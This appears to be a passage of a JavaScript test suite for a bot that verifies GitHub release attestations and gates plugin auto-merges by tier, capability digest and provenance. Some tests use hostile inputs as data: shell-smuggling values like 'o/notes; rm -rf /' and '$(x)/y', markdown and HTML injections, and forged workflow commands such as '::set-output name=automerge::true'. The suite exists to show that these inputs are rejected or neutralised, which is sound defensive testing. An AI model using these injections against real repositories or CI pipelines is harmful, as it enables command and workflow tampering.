  assert.equal(provenanceFailure({ killed: true, signal: "SIGTERM", stderr: "" }), "gh attestation verify timed out");
  assert.equal(provenanceFailure({ stderr: "dial tcp: lookup api.github.com: no such host\nmore" }), "gh attestation verify failed: dial tcp: lookup api.github.com: no such host");
  const verify = (gh, { commit = TAGGED, getJson = githubFor(commit), env = { PATH: "/bin", HOME: "/h", LOCK_TOKEN: "secret", GITHUB_TOKEN: "other" } } = {}) =>
    verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", { token: "tok", run: gh.run, getJson, env });
  const expect = (rest) => ({ workflow: ".github/workflows/release.yml", refs: ["refs/tags/v0.1.1", "refs/heads/main"], commit: TAGGED, ...rest });

  let gh = fakeGh({});
  assert.deepEqual(await verify(gh), expect({ verified: false, why: "no attestation", ref: null }));
  assert.equal(gh.calls.length, 2, "both refs tried");
  gh = fakeGh({ "refs/tags/v0.1.1": Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }), "refs/heads/main": Object.assign(new Error("spawn gh ENOENT"), { code: "ENOENT" }) });
  assert.equal((await verify(gh)).why, "gh is not installed");
  gh = fakeGh({ "refs/tags/v0.1.1": ghFor() });
  assert.deepEqual(await verify(gh), expect({ verified: true, why: null, ref: "refs/tags/v0.1.1" }));
  gh = fakeGh({ "refs/heads/main": ghFor({ ref: "refs/heads/main" }) });
  assert.deepEqual(await verify(gh), expect({ verified: true, why: null, ref: "refs/heads/main" }), "run by hand on main, from the tagged commit");
  gh = fakeGh({ "refs/heads/main": ghFor({ ref: "refs/heads/main", commit: OTHER_COMMIT }) });
  assert.deepEqual(
    await verify(gh),
    expect({ verified: false, ref: null, why: "at refs/tags/v0.1.1: no attestation; at refs/heads/main: an attestation built from another commit than the tag's" }),
  );
  // The toml it pins swapped for another: waits.
  gh = fakeGh({ "refs/tags/v0.1.1": ghResult({ subjects: [sha(WASM_BYTES), sha(Buffer.from("other"))] }) });
  assert.match((await verify(gh)).why, /no attestation covers this plugin\.toml with this plugin\.wasm/);
  // A tag that doesn't resolve, or whose commit isn't on main, never reaches gh.
  gh = fakeGh({ "refs/tags/v0.1.1": ghFor() });
  const lost = await verify(gh, { getJson: apiOf({}) });
  assert.equal(lost.verified, false);
  assert.match(lost.why, /^the tag's commit is unknown: .*HTTP 404/);
  const offMain = await verify(gh, { getJson: githubFor(TAGGED, { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }) });
  assert.deepEqual(offMain, expect({ verified: false, ref: null, why: "the tagged commit is not on main (compare: diverged)", refs: ["refs/tags/v0.1.1", "refs/heads/main"] }));
  assert.equal(gh.calls.length, 0);
  // The calls: gh, an argv array, no shell, a minimal environment, the token only as GH_TOKEN.
  gh = fakeGh({});
  await verify(gh);
  for (const call of gh.calls) {
    assert.equal(call.cmd, "gh");
    assert.equal(call.opts.shell, undefined, "never through a shell");
    assert.deepEqual(call.opts.env, { PATH: "/bin", HOME: "/h", GH_TOKEN: "tok" }, "no LOCK_TOKEN, no GITHUB_TOKEN");
  }
  assert.deepEqual(
    gh.calls.map((c) => c.args.slice(3)),
    ["refs/tags/v0.1.1", "refs/heads/main"].map((ref) => [
      "--repo",
      "o/notes",
      "--cert-identity",
      `https://github.com/o/notes/.github/workflows/release.yml@${ref}`,
      "--source-ref",
      ref,
      "--source-digest",
      TAGGED,
      "--deny-self-hosted-runners",
      "--format",
      "json",
    ]),
  );
  assert.deepEqual(ghEnv({ PATH: "/p", LOCK_TOKEN: "x", GITHUB_TOKEN: "y", GH_TOKEN: "z" }, ""), { PATH: "/p" });
  // A repository or tag outside the lock's grammar never reaches the API or gh.
  let asked = false;
  const never = async () => {
    asked = true;
    return { stdout: "" };
  };
  assert.equal((await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes --repo x", "v0.1.1", { run: never, getJson: never })).verified, false);
  assert.equal((await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1 --format=x", { run: never, getJson: never })).verified, false);
  assert.equal(asked, false);
});

test("gh's arguments are an argv array: release-controlled text can't add a flag", () => {
  const id = attestationIdentity("o/notes", "v1.2.3", TAGGED);
  assert.deepEqual(attestationArgs("/tmp/x/plugin.wasm", id, "refs/tags/v1.2.3"), [
    "attestation",
    "verify",
    "/tmp/x/plugin.wasm",
    "--repo",
    "o/notes",
    "--cert-identity",
    "https://github.com/o/notes/.github/workflows/release.yml@refs/tags/v1.2.3",
    "--source-ref",
    "refs/tags/v1.2.3",
    "--source-digest",
    TAGGED,
    "--deny-self-hosted-runners",
    "--format",
    "json",
  ]);
  assert.equal(attestationArgs("f", id, "refs/heads/main")[6], "https://github.com/o/notes/.github/workflows/release.yml@refs/heads/main");
  for (const ref of ["refs/heads/main2", "refs/heads/feature", "refs/tags/v1.2.3-x", "refs/tags/v1.2.4"]) {
    assert.throws(() => attestationArgs("f", id, ref), /not an accepted ref/, ref);
  }
  for (const [repo, tag, commit] of [
    ["o/notes; rm -rf /", "v1.2.3", TAGGED],
    ["o/notes", "v1.2.3\n--owner x", TAGGED],
    ["o/notes", "1.2.3", TAGGED],
    ["o/notes", "v1.2.3-rc1", TAGGED],
    ["$(x)/y", "v1.2.3", TAGGED],
    ["o/notes", "v1.2.3", "--owner"],
  ]) {
    assert.throws(() => attestationIdentity(repo, tag, commit), /not a (repository|release tag|commit)/);
  }
});

test("each auto-merge condition, false in turn, holds the bump for a person", async () => {
  const pinned = release("0.1.0");
  const same = release("0.1.1");
  const base = entryOf(pinned);
  const pinnedPriv = privileged("0.1.0");
  const priv = entryOf(pinnedPriv);
  const privSame = privileged("0.1.1");
  assert.deepEqual(review(base, pinned, same), { automerge: true, why: null }, "sandboxed: all conditions hold");
  assert.deepEqual(review(priv, pinnedPriv, privSame, VERIFIED), { automerge: true, why: null }, "privileged: all conditions hold");
  // Provenance as verifyProvenance gives it, for each way a release is made.
  const prov = (answers, { getJson = githubFor(TAGGED) } = {}) =>
    verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", { run: fakeGh(answers).run, getJson, env: {} });
  const onMain = await prov({ "refs/heads/main": ghFor({ ref: "refs/heads/main" }) });
  assert.deepEqual(review(priv, pinnedPriv, privSame, onMain), { automerge: true, why: null }, "run by hand on main, from the tagged commit");
  assert.deepEqual(review(priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() })), { automerge: true, why: null }, "tag push");
  const cases = [
    ["the lock's tier is another word", { ...base, tier: "sandboxed " }, pinned, same, VERIFIED, /neither sandboxed nor privileged/],
    ["the lock's caps were edited by hand", { ...base, caps: "0".repeat(64) }, pinned, same, VERIFIED, /the pinned release doesn't read as the tier and caps the lock records/],
    ["the lock's tier was edited by hand", { ...base, tier: "privileged" }, pinned, same, VERIFIED, /the pinned release doesn't read as/],
    ["the pinned release can't be read", base, "not toml [", same, VERIFIED, /the pinned release doesn't read as/],
    ["sandboxed becomes privileged", base, pinned, release("0.1.1").replace('api = "0.2"', 'api = "0.2"\nprograms = [{ name = "pandoc" }]'), VERIFIED, /its tier changes \(sandboxed → privileged\)/],
    ["privileged becomes sandboxed", priv, pinnedPriv, same, VERIFIED, /its tier changes \(privileged → sandboxed\)/],
    ["the release can't be read", base, pinned, "when = 1979-05-27\n", VERIFIED, /the release can't be read/],
    ["the release's digest changed", base, pinned, release("0.1.1").replace('mcp_tools = ["notes_read"]', 'mcp_tools = ["notes_read", "x"]'), VERIFIED, /capability digest is not the approved one/],
    ["the release's digest shrank", base, pinned, release("0.1.1").replace('files = "read"', 'files = "none"'), VERIFIED, /capability digest is not the approved one/],
    ["a privileged release's digest changed", priv, pinnedPriv, privileged("0.1.1", '\nnetwork = "CTAN"'), VERIFIED, /capability digest is not the approved one/],
    ["only the manifest beyond the digest changed", priv, pinnedPriv, privileged("0.1.1", '\nversion = ["-x"]'), VERIFIED, /^its manifest changes more than its words$/],
    ["privileged, not attested", priv, pinnedPriv, privSame, await prov({}), /privileged and its provenance did not verify: no attestation/],
    ["privileged, gh missing", priv, pinnedPriv, privSame, unverified("gh is not installed"), /gh is not installed/],
    ["privileged, never checked", priv, pinnedPriv, privSame, null, /did not verify: not checked/],
    ["privileged, on main from another commit", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghFor({ ref: "refs/heads/main", commit: OTHER_COMMIT }) }), /another commit than the tag's/],
    ["privileged, at the tag from another commit", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor({ commit: OTHER_COMMIT }) }), /another commit than the tag's/],
    ["privileged, signed on another branch", priv, pinnedPriv, privSame, await prov({ "refs/heads/main": ghFor({ san: "https://github.com/o/notes/.github/workflows/release.yml@refs/heads/feature", ref: "refs/heads/main" }) }), /another ref \(refs\/heads\/feature\)/],
    ["privileged, the tag doesn't resolve", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() }, { getJson: apiOf({ [TAG_REF]: { ref: "refs/tags/v0.1.1", object: { type: "tree", sha: TAGGED } } }) }), /the tag's commit is unknown/],
    ["privileged, the tag is on a side commit", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghFor() }, { getJson: githubFor(TAGGED, { status: "diverged", merge_base_commit: { sha: OTHER_COMMIT } }) }), /not on main/],
    ["privileged, plugin.toml swapped", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": ghResult({ subjects: [sha(WASM_BYTES), "9".repeat(64)] }) }), /no attestation covers this plugin\.toml/],
    ["privileged, wasm and toml from two runs", priv, pinnedPriv, privSame, await prov({ "refs/tags/v0.1.1": JSON.stringify([attestation({ subjects: [sha(WASM_BYTES)] }), attestation({ subjects: [sha(TOML_BYTES)] })]) }), /no attestation covers this plugin\.toml/],
    ["privileged, attested by another repository", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ repo: "evil/notes" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another repository/],
    ["privileged, attested by another workflow", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ workflow: ".github/workflows/ci.yml" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another workflow/],
    ["privileged, attested at another ref", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ ref: "refs/heads/main2" }), ID, DIGESTS, "refs/tags/v0.1.1"), /another ref/],
    ["privileged, attested over other bytes", priv, pinnedPriv, privSame, provenanceFrom(ghResult({ subjects: ["0".repeat(64), TOML] }), ID, DIGESTS, "refs/tags/v0.1.1"), /other bytes/],
  ];
  for (const [what, entry, p, r, provenance, reason] of cases) {
    const got = review(entry, p, r, provenance);
    assert.equal(got.automerge, false, what);
    assert.match(got.why, reason, what);
  }
  // The body says where it was signed and from which commit.
  const bump = { ...bumpOf(pinnedPriv, privSame), provenance: onMain, ...review(priv, pinnedPriv, privSame, onMain) };
  assert.match(
    pullRequest([bump]).body,
    /- Provenance: verified — one attestation covers `plugin\.wasm` and `plugin\.toml`, by `o\/notes`'s `\.github\/workflows\/release\.yml`, signed at `refs\/heads\/main`, built from commit `1{40}` \(the tag's, on main\)\./,
  );
  const none = await prov({});
  const waits = { ...bumpOf(pinnedPriv, privSame), provenance: none, ...review(priv, pinnedPriv, privSame, none) };
  assert.match(
    pullRequest([waits]).body,
    /- Provenance: \*\*not verified\*\* \(` no attestation `\); expected one attestation of `plugin\.wasm` and `plugin\.toml` by `o\/notes`'s `\.github\/workflows\/release\.yml` at `refs\/tags\/v0\.1\.1` or `refs\/heads\/main`, built from commit `1{40}`, which must be on main\./,
  );
});

test("a reason from an attestation or gh is inert in the PR body", async () => {
  const pinnedPriv = privileged("0.1.0");
  const priv = entryOf(pinnedPriv);
  const privSame = privileged("0.1.1");
  for (const ref of ["refs/heads/www.evil.example", "refs/heads/<b>x</b>", "refs/heads/`x`` ``y", "refs/heads/@someone [l](https://e.vil)"]) {
    const p = await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", {
      run: fakeGh({ "refs/tags/v0.1.1": ghFor({ san: `https://github.com/o/notes/.github/workflows/release.yml@${ref}` }) }).run,
      getJson: githubFor(TAGGED),
      env: {},
    });
    const b = { ...bumpOf(pinnedPriv, privSame), provenance: p, ...review(priv, pinnedPriv, privSame, p) };
    const { body } = pullRequest([b]);
    if (!ref.includes("@")) assert.ok(b.why.includes(ref), "the hostile ref is in the reason");
    // Everything taken from the attestation sits inside one code span, fenced
    // past any backticks it holds, on a line of its own.
    const reason = body.split("\n").filter((l) => l.startsWith("- `notes` 0.1.1: `"));
    assert.deepEqual(reason, [`- \`notes\` 0.1.1: ${code(b.why)}`], ref);
    const provenance = body.split("\n").filter((l) => l.startsWith("- Provenance:"));
    assert.equal(provenance.length, 1, ref);
    assert.ok(provenance[0].startsWith(`- Provenance: **not verified** (${code(p.why)}); expected`), `${ref}: ${provenance[0]}`);
    const fence = code(b.why).match(/^`+/)[0];
    assert.ok(!b.why.includes(fence), "no run of backticks in the reason closes its span");
  }
  // gh's own first stderr line, too.
  const p = await verifyProvenance(WASM_BYTES, TOML_BYTES, "o/notes", "v0.1.1", {
    run: async () => {
      throw Object.assign(new Error("exit 1"), { stderr: "<img src=x> @someone www.evil.example\nnext" });
    },
    getJson: githubFor(TAGGED),
    env: {},
  });
  const { body } = pullRequest([{ ...bumpOf(pinnedPriv, privSame), provenance: p, ...review(priv, pinnedPriv, privSame, p) }]);
  const why = review(priv, pinnedPriv, privSame, p).why;
  assert.match(why, /<img src=x> @someone www\.evil\.example$/);
  assert.ok(body.split("\n").includes(`- \`notes\` 0.1.1: ${code(why)}`));
  assert.ok(!why.includes("next"), "only gh's first line");
});

test("over every pair of parity-fixture manifests, auto-merge only with the same tier, equal digests, the same manifest but its words, and provenance when privileged", () => {
  const fixture = JSON.parse(readFileSync(new URL("../../web-ui/src/lib/net/fixtures/wire/plugin-caps.json", import.meta.url), "utf8"));
  const manifests = fixture.cases.map((c) => c.frame.manifest);
  // Each manifest also with a setup step, version args, bin or unpack
  // changed where it has them, and with only its words changed.
  const variants = (m) => [
    m,
    m.replace(/version = "1\.2\.3"/, 'version = "1.2.4"').replace(/summary = "A demo\."/, 'summary = "Other words."'),
    m.replace(/args = \["--version"\]/, 'args = ["--evil"]'),
    m.replace(/version = \["--version"\]/, 'version = ["--evil"]'),
    m.replace(/bin = "typst-linux"/, 'bin = "other"'),
    m.replace(/unpack = "zip"/, 'unpack = "none"'),
  ];
  let merged = 0;
  for (const p of manifests) {
    const before = describeManifest(p);
    for (const r of [...new Set(manifests.flatMap(variants))]) {
      const after = describeManifest(r);
      for (const tier of ["sandboxed", "privileged"]) {
        for (const provenance of [VERIFIED, unverified("no attestation"), null]) {
          const { automerge } = review({ id: "demo", tier, caps: before.caps }, p, r, provenance);
          if (!automerge) continue;
          merged++;
          assert.equal(tier, before.tier, "the lock's tier is the pinned release's");
          assert.equal(after.tier, before.tier, "the same tier");
          assert.equal(after.caps, before.caps, "equal digests");
          assert.equal(manifestBehaviour(r), manifestBehaviour(p), "the same manifest but its words");
          if (tier === "privileged") assert.equal(provenance?.verified, true, "privileged needs provenance");
        }
      }
    }
    // An unchanged release merges by itself: sandboxed always, privileged
    // only attested; one that changes only its words too.
    const entry = { id: "demo", tier: before.tier, caps: before.caps };
    for (const r of [p, variants(p)[1]]) {
      assert.equal(review(entry, p, r, VERIFIED).automerge, true);
      assert.equal(review(entry, p, r, unverified("no attestation")).automerge, before.tier === "sandboxed");
    }
    for (const r of variants(p).slice(2).filter((v) => v !== p)) {
      assert.equal(review(entry, p, r, VERIFIED).automerge, false, "a changed setup step, version arg, bin or unpack waits");
    }
  }
  assert.ok(merged > 0);
});

test("a bump whose capabilities are unchanged says so in one line, and keeps tier and caps", () => {
  const pinned = release("0.1.0");
  const bump = bumpOf(pinned, release("0.1.1"));
  assert.equal(bump.automerge, true);
  assert.equal(bump.tier, "sandboxed");
  assert.equal(bump.caps, describeManifest(pinned).caps);
  assert.deepEqual([bump.added, bump.removed], [[], []]);
  const { body } = pullRequest([bump]);
  assert.match(body, /- Tier: sandboxed \(unchanged\)\n- Capabilities unchanged: `caps` stays `[0-9a-f]{12}`\.\n/);
  assert.doesNotMatch(body, /Adds:|Drops:/);
  assert.match(body, /Auto-merge \(squash\) is on/);
  assert.match(body, /\[Changes v0\.1\.0\.\.\.v0\.1\.1\]\(https:\/\/github\.com\/o\/notes\/compare\/v0\.1\.0\.\.\.v0\.1\.1\)/);
});

test("a bump that adds a tool waits, carries the new caps, and says what it adds", () => {
  const pinned = release("0.1.0");
  const next = release("0.2.0").replace('mcp_tools = ["notes_read"]', 'mcp_tools = ["notes_read", "notes_write"]');
  const bump = bumpOf(pinned, next);
  assert.equal(bump.automerge, false);
  assert.equal(bump.why, "its capability digest is not the approved one: it may ask for more; its manifest changes more than its words");
  assert.equal(bump.tier, "sandboxed");
  assert.equal(bump.caps, describeManifest(next).caps);
  assert.notEqual(bump.caps, bump.from_caps);
  assert.deepEqual(bump.added.map((l) => l.text), ["Gives agents 1 tool: notes_write"]);
  assert.deepEqual(bump.removed, []);
  const { body, automerge } = pullRequest([bump]);
  assert.equal(automerge, false);
  assert.match(body, /- Tier: sandboxed \(unchanged\)\n- `caps`: `[0-9a-f]{12}` → `[0-9a-f]{12}`\n- Adds:\n  - ` Gives agents 1 tool: notes_write `\n/);
  assert.match(body, /no auto-merge/);
  assert.match(body, /The lock is written with each release's own `tier` and `caps`/);
  assert.match(body, /a green check here is not an approval/);
  assert.doesNotMatch(body, /set its `tier` and `caps`/, "no hand edit is asked for");
});

test("a bump that becomes privileged says the tier changed and what it runs; one that drops a capability says so", () => {
  const pinned = release("0.1.0");
  const next = release("0.2.0", '[[programs]]\nname = "bash"\n\n[[programs]]\nname = "pandoc"\nnetwork = "CTAN mirrors"').replace('files = "read"', 'files = "none"');
  const bump = bumpOf(pinned, next);
  assert.equal(bump.automerge, false);
  assert.equal(bump.from_tier, "sandboxed");
  assert.equal(bump.tier, "privileged");
  assert.deepEqual(
    bump.added.map((l) => [l.text, l.privileged]),
    [
      ["Runs bash: this plugin can run any command on this host", true],
      ["Runs programs on this host: pandoc (with your permissions, under chimaera's time and memory limits)", true],
      ["pandoc uses the network: CTAN mirrors", true],
    ],
  );
  assert.deepEqual(bump.removed.map((l) => l.text), ["Reads files in this workspace"]);
  const { body } = pullRequest([bump]);
  assert.match(body, /- Tier: sandboxed → \*\*privileged\*\*\n/);
  assert.match(body, /  - \*\*privileged\*\* ` Runs bash: this plugin can run any command on this host `\n/);
  assert.match(body, /- Drops:\n  - ` Reads files in this workspace `\n/);
});

test("text from a release can't inject markdown, mentions, links or workflow commands", () => {
  const hostileName = "Evil | [x](https://e.vil) <img src=x> @someone **b** ::set-output name=automerge::true";
  const pinned = release("0.1.0");
  const next = release(
    "0.2.0",
    '[[programs]]\nname = "tool"\nnetwork = "`code` [y](https://e.vil) <script> @team \\n## heading ::warning::x"',
    hostileName,
  );
  const bump = bumpOf(pinned, next);
  assert.equal(bump.name, hostileName);
  const { body, title } = pullRequest([bump]);
  // The name: every punctuation mark escaped, no mention, no autolink.
  assert.ok(!body.includes("[x](https://e.vil)"), "no link forms");
  assert.doesNotMatch(body, /(^|[^\\])<img/m, "no HTML");
  assert.ok(!body.includes("@someone"), "no mention");
  assert.ok(!body.includes("| [x]"), "no extra table cell");
  assert.match(body, /\| Evil \\\| \\\[x\\\]\\\(https\\:\u200b\\\/\\\/e\\\.vil\\\) \\<img src\\=x\\> @\u200bsomeone \\\*\\\*b\\\*\\\* /);
  // A capability string: a literal code span, on its own line.
  assert.match(body, /  - \*\*privileged\*\* `` tool uses the network: `code` \[y\]\(https:\/\/e\.vil\) <script> @team  ## heading ::warning::x ``\n/);
  assert.ok(!body.split("\n").some((line) => line.startsWith("## heading")), "a newline in a manifest value starts no line");
  assert.ok(!body.split("\n").some((line) => line.startsWith("::")), "nor a workflow command");
  // The title is one line; the outputs never carry release text.
  assert.ok(!/[\r\n]/.test(title));
  assert.equal(outputs([bump], []), "bumped=true\nautomerge=false\nproblems=0\n");
  // A refusal's message is escaped before it rides a workflow command.
  assert.equal(commandMessage("a\nb\r%0A::set-output"), "a%0Ab%0D%250A::set-output");
});

test("md and code: release text as plain markdown and as a literal span", () => {
  assert.equal(md("a_b *c* #1"), "a\\_b \\*c\\* \\#1");
  assert.equal(md("two\nlines\u2028x"), "two lines x");
  assert.equal(md("visit www.e.vil"), "visit www\u200b\\.e\\.vil");
  assert.equal(code("plain"), "` plain `");
  assert.equal(code("has `ticks` and ``more``"), "``` has `ticks` and ``more`` ```");
  assert.equal(code("x\ny"), "` x y `");
});

test("a manifest the port can't read for capabilities is refused, not guessed", () => {
  const pinned = release("0.1.0");
  const entry = { id: "notes", tier: "sandboxed", caps: describeManifest(pinned).caps };
  assert.throws(() => capabilityChange(entry, pinned, release("0.2.0", "[[screens]]\nid = \"x\"")), /doesn't know: "screens"/);
  assert.throws(() => capabilityChange(entry, pinned, release("0.2.0", "when = 1979-05-27")), /dates and times/);
  assert.throws(() => capabilityChange(entry, pinned, release("0.2.0").replace('id = "notes"', 'id = "notes"\n"id" = "other"')), /set twice/);
  // A pinned manifest it can't read only costs the comparison.
  const change = capabilityChange(entry, "not toml at all [", release("0.2.0"));
  assert.equal(change.added, null);
  assert.match(change.unreadable, /plugin\.toml line/);
  const { body } = pullRequest([{ ...bumpOf(pinned, release("0.2.0")), ...change, caps: "9".repeat(64) }]);
  assert.match(body, /couldn't be read here/);
  // The lock's values for the pinned release are checked against the reading.
  const drift = capabilityChange({ ...entry, caps: "0".repeat(64) }, pinned, release("0.2.0"));
  assert.match(drift.lock_drift, /caps reads [0-9a-f]{12}/);
});
